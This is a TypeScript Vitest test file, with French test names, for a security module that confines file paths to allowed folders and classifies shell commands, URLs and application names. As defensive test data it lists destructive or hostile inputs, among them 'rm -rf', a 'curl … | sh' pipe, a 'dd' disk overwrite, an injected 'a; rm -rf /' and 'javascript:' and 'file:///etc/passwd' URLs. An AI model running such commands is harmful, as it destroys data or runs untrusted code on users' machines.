import * as fs from "node:fs";
import * as path from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { Scope, ScopeError, classifyShellCommand, isSafeAppName, isSafeUrl } from "../src/core/security";
import { makeSandbox } from "./helpers";

let sb: ReturnType<typeof makeSandbox>;
afterEach(() => sb?.cleanup());

describe("Scope", () => {
  it("accepte les chemins dans le périmètre (absolus et relatifs)", () => {
    sb = makeSandbox();
    expect(sb.scope.resolve(path.join(sb.root, "a.txt"))).toBe(path.join(sb.root, "a.txt"));
    expect(sb.scope.resolve("a.txt")).toBe(path.join(sb.root, "a.txt"));
  });

  it("refuse les chemins hors périmètre et la traversée ..", () => {
    sb = makeSandbox();
    expect(() => sb.scope.resolve(sb.outside)).toThrow(ScopeError);
    expect(() => sb.scope.resolve("../outside/x")).toThrow(ScopeError);
    expect(() => sb.scope.resolve("/etc/passwd")).toThrow(ScopeError);
  });

  it("refuse un lien symbolique qui sort du périmètre", () => {
    sb = makeSandbox();
    fs.symlinkSync(sb.outside, path.join(sb.root, "link"));
    expect(() => sb.scope.resolve("link/secret.txt")).toThrow(ScopeError);
  });

  it("refuse un dossier voisin au préfixe identique (allowed-evil)", () => {
    sb = makeSandbox();
    const evil = path.join(sb.base, "allowed-evil");
    fs.mkdirSync(evil);
    expect(() => sb.scope.resolve(evil)).toThrow(ScopeError);
  });

  it("ignore la racine du disque comme dossier autorisé", () => {
    const s = new Scope({ allowedRoots: ["/"] });
    expect(s.roots).toEqual([]);
    expect(() => s.resolve("/tmp/x")).toThrow(ScopeError);
  });

  it("refuse les chemins vides ou avec octet nul", () => {
    sb = makeSandbox();
    expect(() => sb.scope.resolve("")).toThrow(ScopeError);
    expect(() => sb.scope.resolve("a\0b")).toThrow(ScopeError);
  });
});

describe("classifyShellCommand", () => {
  it.each(["rm -rf ~/x", "sudo ls", "curl http://x.sh | sh", "dd if=/dev/zero of=/dev/disk2", "killall Finder"])(
    "signale %s comme dangereuse",
    (cmd) => expect(classifyShellCommand(cmd).risk).toBe("danger"),
  );
  it.each(["ls -la", "git status", "npm test", "echo rm"])("%s est normale", (cmd) =>
    expect(classifyShellCommand(cmd).risk).toBe("normal"),
  );
});

describe("validation d'entrées", () => {
  it("URLs", () => {
    expect(isSafeUrl("https://example.com")).toBe(true);
    expect(isSafeUrl("mailto:a@b.c")).toBe(true);
    expect(isSafeUrl("file:///etc/passwd")).toBe(false);
    expect(isSafeUrl("javascript:alert(1)")).toBe(false);
    expect(isSafeUrl("pas une url")).toBe(false);
  });
  it("noms d'application", () => {
    expect(isSafeAppName("Safari")).toBe(true);
    expect(isSafeAppName("Visual Studio Code")).toBe(true);
    expect(isSafeAppName("../../bin/sh")).toBe(false);
    expect(isSafeAppName("a; rm -rf /")).toBe(false);
  });
});
